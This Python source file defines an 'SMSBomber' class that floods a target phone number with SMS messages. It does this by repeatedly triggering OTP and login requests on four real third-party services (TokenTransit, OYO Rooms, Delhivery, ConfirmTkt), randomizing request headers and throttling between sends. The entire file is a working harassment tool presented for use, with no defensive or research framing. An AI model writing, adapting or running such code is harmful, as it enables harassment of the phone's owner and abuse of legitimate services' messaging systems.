"""
 Copyright (c) 2023. Vili and contributors.

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
 """

import requests
import random
import time
from helper import printer, timer
from utils.randomuser import users


class SMSBomber:
    """
    Spams SMS to the target phone number.

    :param number: target phone number
    :param count: number of SMS to send
    :param throttle: throttle time between each SMS
    """
    def __init__(self, number, count, throttle):
        self.number = number
        self.count = int(count)
        self.throttle = int(throttle)
        self.urls = [
            f"https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20{number}",
            f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone={number}",
            f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={number}",
            f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={number}"
        ]
        self.session = requests.session()
        self.session.headers = random.choice(users)

        try:
            printer.info(f"Trying to send {self.count} SMS to '{self.number}'...")
            self.start()
        except KeyboardInterrupt:
            printer.error("Cancelled..!")
        except Exception as e:
            printer.error(f"Error : {e}")

    @timer.timer
    def start(self):
        successes = 0
        fails = 0
        try:
            for i in range(self.count):
                url = random.choice(self.urls)
                response = self.session.post(url)
                time.sleep(self.throttle)

                if response.status_code == 200:
                    successes += 1
                    printer.success(f"Sent SMS #{successes} to '{self.number}'")
                else:
                    fails += 1
                    printer.warning(f"Failed to send SMS #{fails} to '{self.number}' with status code {response.status_code}")
        except Exception as e:
            printer.error(f"Error : {e}")

        printer.success(f"Finished sending {successes} SMS to '{self.number}'..!")
